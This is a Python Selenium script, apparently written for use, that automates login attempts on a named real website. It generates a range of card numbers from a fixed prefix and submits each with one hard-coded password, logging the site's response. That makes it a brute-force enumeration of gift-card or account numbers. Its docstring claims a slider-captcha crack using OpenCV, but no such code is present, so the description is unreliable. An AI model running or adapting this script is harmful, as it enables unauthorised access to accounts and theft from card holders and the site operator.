import time

from selenium import webdriver
from selenium.webdriver.common.by import By


class Crab:
    """ 防水墙滑动验证码破解 使用OpenCV库"""

    def __init__(self):
        self.url = "http://xrj.360xie.cn"
        self.driver = webdriver.Chrome()

    def login_main(self, no_list):
        driver = self.driver
        driver.implicitly_wait(5)
        driver.get(self.url)

        for no in no_list:
            print("当前尝试的卡号：" + no, end="，")
            know_btn = driver.find_element(By.XPATH, '//*[@id="aNext"]')
            know_btn.click()
            card_no = driver.find_element(By.ID, 'txtCardNo')
            card_no.send_keys(no)
            card_psw = driver.find_element(By.ID, 'txtCardPsw')
            card_psw.send_keys("834114")
            btn_search = driver.find_element(By.ID, 'btnSearch')
            btn_search.click()

            time.sleep(5)
            print(driver.switch_to.alert.text)
            driver.switch_to.alert.accept()

        driver.close()

    @staticmethod
    def random_no():
        head = "22118800"
        result = []
        # first = [3, 5, 6, 9]
        first = [8]
        second = [0, 2, 3, 4, 5, 6, 8, 9]
        last = [1, 2, 3, 4, 5, 6, 7, 8, 9]
        for i in first:
            for j in second:
                for m in last:
                    res = head + str(i) + "0" + str(j) + str(m)
                    result.append(res)
        return result


if __name__ == '__main__':
    c = Crab()
    NO_list = c.random_no()
    c.login_main(NO_list)
